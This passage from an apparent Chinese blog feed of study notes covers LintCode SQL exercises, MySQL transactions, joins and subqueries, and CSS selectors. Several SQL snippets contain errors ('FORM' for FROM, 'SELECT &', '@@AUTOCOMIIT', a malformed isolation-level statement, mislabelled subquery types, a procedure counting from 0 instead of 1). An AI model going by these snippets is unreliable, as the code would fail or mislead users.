style="text-align:left">‘USA’</td></tr><tr><td style="text-align:left">4</td><td style="text-align:left">‘Southern Emperor’</td><td style="text-align:left">‘<a href="mailto:southern.emperor@qq.com">southern.emperor@qq.com</a>’</td><td style="text-align:left">21</td><td style="text-align:left">‘JP’</td></tr></tbody></table><p><strong>返回结果：</strong></p><table><thead><tr><th style="text-align:left">id</th><th style="text-align:left">name</th><th style="text-align:left">email</th><th style="text-align:left">age</th><th style="text-align:left">country</th></tr></thead><tbody><tr><td style="text-align:left">3</td><td style="text-align:left">‘Western Venom’</td><td style="text-align:left">‘<a href="mailto:western.venom@163.com">western.venom@163.com</a>’</td><td style="text-align:left">28</td><td style="text-align:left"></td></tr></tbody></table><p>题解：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">create algorithm = Merge view v_teachers</span><br><span class="line">as </span><br><span class="line">select *</span><br><span class="line">from teachers </span><br><span class="line">where age&gt;25;</span><br></pre></td></tr></table></figure><p><strong>主要是algorithm = Merge创建merge的视图</strong></p><p>18.lintcode 创建批量插入数据的存储过程</p><p>我们需要向 <code>teachers</code> 表中插入 <code>30000</code> 条测试数据，包含教师姓名 <code>name = 'teacher' + 测试 id</code>，（测试 <code>id 从 1 增加到 30000</code>），教师邮箱 <code>email = name + '@chapter.com'</code>，教师年龄 <code>age = 26 + (id%20)</code><br>请利用 <code>SQl</code> 的存储过程来实现，请将存储过程命名为 <code>addTeachers</code>。</p><p>最短时间刷“透”算法面试：《66页算法宝典》.pdf</p><p>微信添加【jiuzhangfeifei】备注【66】领取</p><p>样例</p><p><strong>输入数据：</strong></p><p><code>teachers</code> 表：</p><table><thead><tr><th style="text-align:left">id</th><th style="text-align:left">name</th><th style="text-align:left">email</th><th style="text-align:left">age</th><th style="text-align:left">country</th></tr></thead><tbody><tr><td style="text-align:left"></td><td style="text-align:left"></td><td style="text-align:left"></td><td style="text-align:left"></td><td style="text-align:left"></td></tr></tbody></table><p><strong>返回结果：</strong></p><table><thead><tr><th style="text-align:left">id</th><th style="text-align:left">name</th><th style="text-align:left">email</th><th style="text-align:left">age</th><th style="text-align:left">country</th></tr></thead><tbody><tr><td style="text-align:left">1</td><td style="text-align:left">‘teacher1’</td><td style="text-align:left">‘<a href="mailto:teacher1@chapter.com">teacher1@chapter.com</a>’</td><td style="text-align:left">27</td><td style="text-align:left">‘’</td></tr><tr><td style="text-align:left">2</td><td style="text-align:left">‘teacher2’</td><td style="text-align:left">‘<a href="mailto:teacher2@chapter.com">teacher2@chapter.com</a>’</td><td style="text-align:left">28</td><td style="text-align:left">‘’</td></tr><tr><td style="text-align:left">3</td><td style="text-align:left">‘teacher3’</td><td style="text-align:left">‘<a href="mailto:teacher3@chapter.com">teacher3@chapter.com</a>’</td><td style="text-align:left">29</td><td style="text-align:left">‘’</td></tr><tr><td style="text-align:left">4</td><td style="text-align:left">‘teacher4’</td><td style="text-align:left">‘<a href="mailto:teacher4@chapter.com">teacher4@chapter.com</a>’</td><td style="text-align:left">30</td><td style="text-align:left">‘’</td></tr><tr><td style="text-align:left">5</td><td style="text-align:left">‘teacher5’</td><td style="text-align:left">‘<a href="mailto:teacher5@chapter.com">teacher5@chapter.com</a>’</td><td style="text-align:left">31</td><td style="text-align:left">‘’</td></tr><tr><td style="text-align:left">6</td><td style="text-align:left">‘teacher6’</td><td style="text-align:left">‘<a href="mailto:teacher6@chapter.com">teacher6@chapter.com</a>’</td><td style="text-align:left">32</td><td style="text-align:left">‘’</td></tr><tr><td style="text-align:left">7</td><td style="text-align:left">‘teacher7’</td><td style="text-align:left">‘<a href="mailto:teacher7@chapter.com">teacher7@chapter.com</a>’</td><td style="text-align:left">33</td><td style="text-align:left">‘’</td></tr><tr><td style="text-align:left">‘…’</td><td style="text-align:left">‘…’</td><td style="text-align:left">‘…’</td><td style="text-align:left">‘…’</td><td style="text-align:left">‘…’</td></tr></tbody></table><p>题解：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">CREATE PROCEDURE addTeachers()</span><br><span class="line">BEGIN</span><br><span class="line">    DECLARE num INT DEFAULT 0;</span><br><span class="line">    WHILE num &lt; 30000 DO</span><br><span class="line">        INSERT INTO teachers (name, email, age, country)</span><br><span class="line">        VALUES (CONCAT(&#x27;teacher&#x27;, num), CONCAT(&#x27;teacher&#x27;, num, &#x27;@chapter.com&#x27;), 26 + (num % 20), &#x27;&#x27;);</span><br><span class="line">        SET num = num + 1;</span><br><span class="line">    END WHILE;</span><br><span class="line">END;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> sql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql 事务</title>
      <link href="/2024/07/22/mysql6/"/>
      <url>/2024/07/22/mysql6/</url>
      
        <content type="html"><![CDATA[<h1>事务</h1><p>简介：</p><p>是一系列操作的集合，是一个不可分割的工作单位</p><p>要么同时成功要么同时失败</p><ul><li>开始事务</li><li>错误了就回滚事务</li><li>然后提交事务</li></ul><p>实例银行：</p><p>查询账户余额：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT &amp; FROM ACCOUNT WHERE NAME = &quot;A&quot;;</span><br></pre></td></tr></table></figure><p>将账户余额-1000</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE ACCOUNT SET MONEY = MONEY -1000 WHERE NAME = &#x27;A&#x27;;</span><br></pre></td></tr></table></figure><p>别人账户余额+1000</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE ACCOUNT SET MONEY = MONEY + 1000 WHERE NAME = &#x27;B&#x27;;</span><br></pre></td></tr></table></figure><h2 id="事务控制">事务控制</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT @@AUTOCOMMIT;</span><br><span class="line">SET @@AUTOCOMIIT = 0;</span><br></pre></td></tr></table></figure><p>设置为手动提交</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">commit;</span><br></pre></td></tr></table></figure><p>提交</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rollback;</span><br></pre></td></tr></table></figure><p>回滚事务</p><p>开启事务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">START TRANSACTION 或 BEGIN;</span><br></pre></td></tr></table></figure><h2 id="事务的四大特性">事务的四大特性</h2><p>原子性：事务是不可分割的最小操作元，要么全部成功，要么全部失败</p><p>一致性：事务完成时，必须所有数据必须保持一致状态</p><p>隔离性：数据库提供隔离机制，事务不受外部并发环境的影响</p><p>持久性：事务一旦提交或者回滚看，在数据库中的数据改变就是永久的</p><h2 id="事务并发问题">事务并发问题</h2><h3 id="脏读">脏读</h3><p>一个事务读到另一个事务还没提交的数据</p><h3 id="不可重复读">不可重复读</h3><p>一个事务先后读取到同一条记录，但是两次读取的数据不同</p><h3 id="幻读">幻读</h3><p>一个事务按照条件查询数据的时候，没有对应的数据行，但是在插入数据的时候，发现这行数据已经存在了，好像出现了幻觉</p><h2 id="事务的隔离级别">事务的隔离级别</h2><p>解决事务的问题</p><p>read uncommitted 三种问题都会出现</p><p>read comitted解决了脏读的问题</p><p>repeatable read（mysql默认）无法解决幻读的问题</p><p>serializable(看情况)三种问题都能解决</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT @@TRANSACTION_ISOLATION</span><br></pre></td></tr></table></figure><p>查看当前的隔离级别</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SET SESSION TRANSACTION_ISOLATION LEVEL [几种级别]</span><br></pre></td></tr></table></figure><p>设置当前的隔离级别</p>]]></content>
      
      
      <categories>
          
          <category> sql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql 多表查询</title>
      <link href="/2024/07/19/mysql5/"/>
      <url>/2024/07/19/mysql5/</url>
      
        <content type="html"><![CDATA[<h1>多表查询</h1><h2 id="关系：">关系：</h2><h3 id="一对多">一对多</h3><p>例如：部门和员工之间的关系</p><p>实现：在多的一方建立外键，指向一的一方</p><h3 id="多对多">多对多</h3><p>例如：学生和课程的关系</p><p>实现：建立第三张中间表，至少包含两个外键，分别关联两方</p><h3 id="一对一">一对一</h3><p>例如：用户与用户详情之间的关系</p><p>实现：在任意的一方加入外键，关联另一方的主键，并且设置外键是唯一的</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> tb_user (</span><br><span class="line">                                       id <span class="type">INT</span> AUTO_INCREMENT <span class="keyword">PRIMARY</span> KEY COMMENT <span class="string">&#x27;用户ID&#x27;</span>,</span><br><span class="line">                                       name <span class="type">VARCHAR</span>(<span class="number">10</span>) COMMENT <span class="string">&#x27;姓名&#x27;</span>,</span><br><span class="line">                                       age <span class="type">INT</span> COMMENT <span class="string">&#x27;年龄&#x27;</span>,</span><br><span class="line">                                       gender <span class="type">CHAR</span>(<span class="number">1</span>) COMMENT <span class="string">&#x27;性别，1：男，2：女&#x27;</span>,</span><br><span class="line">                                       phone <span class="type">CHAR</span>(<span class="number">11</span>) COMMENT <span class="string">&#x27;手机号&#x27;</span>,</span><br><span class="line">                                       <span class="keyword">CONSTRAINT</span> uc_phone <span class="keyword">UNIQUE</span> (phone) <span class="comment">-- 添加唯一约束，确保手机号唯一</span></span><br><span class="line">) COMMENT <span class="string">&#x27;用户基本信息表&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建用户教育信息表 tb_useredu</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> tb_useredu (</span><br><span class="line">                                          id <span class="type">INT</span> AUTO_INCREMENT <span class="keyword">PRIMARY</span> KEY COMMENT <span class="string">&#x27;教育信息ID&#x27;</span>,</span><br><span class="line">                                          degree <span class="type">VARCHAR</span>(<span class="number">20</span>) COMMENT <span class="string">&#x27;学历&#x27;</span>,</span><br><span class="line">                                          major <span class="type">VARCHAR</span>(<span class="number">50</span>) COMMENT <span class="string">&#x27;专业&#x27;</span>,</span><br><span class="line">                                          primaryschool <span class="type">VARCHAR</span>(<span class="number">50</span>) COMMENT <span class="string">&#x27;小学&#x27;</span>,</span><br><span class="line">                                          middleschool <span class="type">VARCHAR</span>(<span class="number">50</span>) COMMENT <span class="string">&#x27;中学&#x27;</span>,</span><br><span class="line">                                          university <span class="type">VARCHAR</span>(<span class="number">50</span>) COMMENT <span class="string">&#x27;大学&#x27;</span>,</span><br><span class="line">                                          userid <span class="type">INT</span> COMMENT <span class="string">&#x27;用户ID&#x27;</span>,</span><br><span class="line">                                          <span class="keyword">CONSTRAINT</span> fk_userid <span class="keyword">FOREIGN</span> KEY (userid) <span class="keyword">REFERENCES</span> tb_user(id) <span class="keyword">ON</span> <span class="keyword">DELETE</span> CASCADE <span class="keyword">ON</span> <span class="keyword">UPDATE</span> CASCADE</span><br><span class="line">) COMMENT <span class="string">&#x27;用户教育信息表&#x27;</span>;</span><br></pre></td></tr></table></figure><p><strong>CONSTRAINT uc_phone UNIQUE (phone) – 添加唯一约束，确保手机号唯一主要是这个用来确定1对1</strong></p><h2 id="多表查询">多表查询</h2><p>单表查询</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FORM EMP;</span><br></pre></td></tr></table></figure><p>多表查询</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FORM EMP , DEPT;</span><br></pre></td></tr></table></figure><p>笛卡尔积：a集合和b集合所有的组合情况</p><p>直接查询的是表的笛卡尔积</p><p>所以要消除无效的笛卡尔积，要加入条件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FORM EMP , DEPT WHERE EMP.DEPT_ID = DEPT.ID;</span><br></pre></td></tr></table></figure><p>这样就能找到其有效的</p><h2 id="分类">分类</h2><h3 id="内连接">内连接</h3><p>两张表之间交集的部分</p><p>隐式内连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT 字段列表 FROM TABLE_1 , TABLE_2 WHERE....;</span><br></pre></td></tr></table></figure><p>显示内连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT 字段列表 FROM TABLE_1 [INNER]JOIN TABLE_2 ON 连接条件....；</span><br></pre></td></tr></table></figure><h3 id="外连接">外连接</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT 字段列表 FROM TABLE_1 LEFT [OUTER] JOIN TABLE_2 ON WHERE...;</span><br></pre></td></tr></table></figure><p>相当与查询表1（左表）的所有数据包含表1和表2交集的部分</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT 字段列表 FROM TABLE_1 RIGHT [OUTER] JOIN TABLE_2 ON WHERE...;</span><br></pre></td></tr></table></figure><p>相当与查询表2（右表）的所有数据包含表1和表2交集的部分</p><h3 id="自连接">自连接</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT 字段列表 FROM TABLE_A A JOIN TABLE_A B ON WHERE（条件）;</span><br></pre></td></tr></table></figure><p>实例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT A.NAME B.NAMME FORM EMP A , EMP B WHERE A.MAID = B.ID;</span><br></pre></td></tr></table></figure><h3 id="联合查询">联合查询</h3><p>就是把多次查询的结果合并起来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT 字段列表 FROM A....;</span><br><span class="line">UNION[ALL]</span><br><span class="line">SELECT 字段列表 FROM B....;</span><br></pre></td></tr></table></figure><p>多张表的列数必须保持一致，字段类型也需要一致。</p><h3 id="子查询">子查询</h3><p>在sql语句中嵌套select语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT *FROM T1 WHERE COLUMN1 = (SELECT COLUMN1 FORM T2);</span><br></pre></td></tr></table></figure><p>外部的语句可以是insert update delete select其中的任意一个</p><ul><li><p>标量子查询(子查询的结果为单个值)</p></li><li><p>列子查询（子查询的结果为单个值）</p></li><li><p>行子查询（子查询的结果为一列）</p></li><li><p>表子查询（子查询的结果为多行多列）</p></li></ul><p>子查询的位置</p><ul><li>where 之后</li><li>from之后</li><li>select之后</li></ul><h4 id="标量子查询">标量子查询</h4><p>常用的操作符号 = &lt;&gt; &gt; =…</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from emp where dept_id = (select id from dept where name = &#x27;aaa&#x27;);</span><br></pre></td></tr></table></figure><h4 id="列子查询">列子查询</h4><p>常用用操作符：</p><ul><li>in</li><li>not in</li><li>any（返回的列表中，任意一个就行）</li><li>some</li><li>all（所有的指都要满足）</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT ID FROM DEPT WHERE NAME = &#x27;AA&#x27; OR NAME = &#x27;BB&#x27;;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM EMP WHERE DEPT_ID IN (SELECT ID FROM DEPT WHERE NAME = &#x27;AA&#x27; OR NAME = &#x27;BB&#x27;);</span><br></pre></td></tr></table></figure><h4 id="行子查询">行子查询</h4><p><strong>= &lt;&gt; in not in</strong>等操作符</p><p>主要是分布查询，然后用子查询来完成任务</p><h4 id="表子查询">表子查询</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> EMP <span class="keyword">WHERE</span> (JOB,SALARY) <span class="keyword">IN</span> (<span class="keyword">SELECT</span> JOB , SALARY <span class="keyword">FROM</span> EMP <span class="keyword">WHERE</span> NAME <span class="operator">=</span> <span class="string">&#x27;A&#x27;</span> <span class="keyword">OR</span> NAME <span class="operator">=</span> <span class="string">&#x27;B&#x27;</span>);</span><br></pre></td></tr></table></figure><p><strong>总结：使用表子查询主要是多个条件，然后将条件分别分开，然后用一个sql语句的子查询来完成任务。</strong></p><h2 id="多表查询练习">多表查询练习</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> E.NAME,E.AGE,E.JOB,D.NAME <span class="keyword">FROM</span> EMP E ,DEPT D <span class="keyword">WHERE</span> E.DEPT_ID <span class="operator">=</span> D.ID</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> sql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSS BASIC1</title>
      <link href="/2024/07/11/css1/"/>
      <url>/2024/07/11/css1/</url>
      
        <content type="html"><![CDATA[<h1>CSS</h1><p>网页分为三个部分：</p><p>结构：html</p><p>表现：css</p><p>行为：js</p><h1>书写样式</h1><h3 id="内联样式">内联样式</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en`&quot;&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">        &lt;meta name=&quot;test&quot; content=&quot;width-device-width&quot;&gt;</span><br><span class="line">        &lt;meta http-equiv=&quot;x-ua-compatible&quot; content=&quot;ie-edge&quot;&gt;</span><br><span class="line">        &lt;time datetime=&quot;gogog&quot;&gt;&lt;/time&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;p style=&quot;color: red; font-size: 60px;&quot;&gt;</span><br><span class="line">            狗狗狗狗欧冠</span><br><span class="line">        &lt;/p&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>简单的css及其展示</p><!DOCTYPE html><html lang="en`">    <head>        <meta charset="utf-8">        <meta name="test" content="width-device-width">        <meta http-equiv="x-ua-compatible" content="ie-edge">        <time datetime="gogog"></time>    </head>    <body>        <p style="color: red; font-size: 60px;">            我是📕        </p>    </body></html><p>不推荐使用，样式只能对一个标签进行修改，不方便修改，开发时不推荐使用</p><h3 id="内部样式">内部样式</h3><p>将样式写道head的style标签里</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en`&quot;&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">        &lt;meta name=&quot;test&quot; content=&quot;width-device-width&quot;&gt;</span><br><span class="line">        &lt;meta http-equiv=&quot;x-ua-compatible&quot; content=&quot;ie-edge&quot;&gt;</span><br><span class="line">        &lt;time datetime=&quot;gogog&quot;&gt;&lt;/time&gt;</span><br><span class="line">        &lt;style&gt;</span><br><span class="line">            p&#123;</span><br><span class="line">                color: red; font-size: 60px</span><br><span class="line">            &#125;</span><br><span class="line">        &lt;/style&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;p&gt;狗狗狗狗欧冠&lt;/p&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>内部方式，不能跨页面使用。</p><h3 id="外部css文件中（开发最佳的）">外部css文件中（开发最佳的）</h3><p>css写在外部标签中，再使用link标签插入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en`&quot;&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">        &lt;meta name=&quot;test&quot; content=&quot;width-device-width&quot;&gt;</span><br><span class="line">        &lt;meta http-equiv=&quot;x-ua-compatible&quot; content=&quot;ie-edge&quot;&gt;</span><br><span class="line">        &lt;time datetime=&quot;gogog&quot;&gt;&lt;/time&gt;</span><br><span class="line">        &lt;link rel=&quot;stylesheet&quot; href=&quot;./style.css&quot;</span><br><span class="line"></span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;p&gt;狗狗狗狗欧冠&lt;/p&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>只要是想使用这个css都可以使用</p><p>可以使用浏览器的缓存机制，从而加载网页的加载速度，提高用户的体验</p><h2 id="css基本语法">css基本语法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">aaaaaa</span><br><span class="line">*/</span><br></pre></td></tr></table></figure><p>css的注释</p><p>css选择器+css声明块</p><p>选择器：通过选择器可以选定页面中的指定元素</p><p>声明块：是用来为元素来设置样式的，由一个个的声明组成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p&#123;</span><br><span class="line">    width: 50px;</span><br><span class="line">    color: aqua;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个样式名和样式值组成</p><h1>常用选择器</h1><h3 id="元素选择器">元素选择器</h3><p>标签名{</p><p>},选中了全部，不太方便</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="id选择器">id选择器</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#id&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="class选择器">class选择器</h3><p>class属性和id类似，不用的是class可以重复使用，通过class属性用来对元素进行分组</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.bule&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个元素可以用多个类，多个class用空格隔开</p><h3 id="通配选择器">通配选择器</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="复合选择器">复合选择器</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">div.class&#123;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>语法：选择器1.选择器2.选择器…{</p><p>}</p><p><strong>如果有元素选择器必须要元素选择器开头</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">h1,span&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时选择多个选择器</p><h2 id="关系选择器">关系选择器</h2><p>父子兄弟选择器：</p><p>父子关系：直接包含</p><p>祖先后代关系：直接或间接包含</p><p>兄弟关系</p><p>父子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">div.box &gt; p&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>后代：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">div p&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>兄弟：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p + span&#123;</span><br><span class="line">下边一个</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p ~ span&#123;</span><br><span class="line">下面所有的</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>选的都是下边的兄弟</p><h2 id="属性选择器">属性选择器</h2><p>title标签的标题</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p[title]&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>选择包含title的属性的元素</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p[title=aaaa]&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>选择特定属性的元素</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p[title^=aaaa]&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>选择以…开头的元素</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p[title$=aaaa]&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以…结尾</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p[title*=aaaa]&#123;</span><br><span class="line"></span><br><span 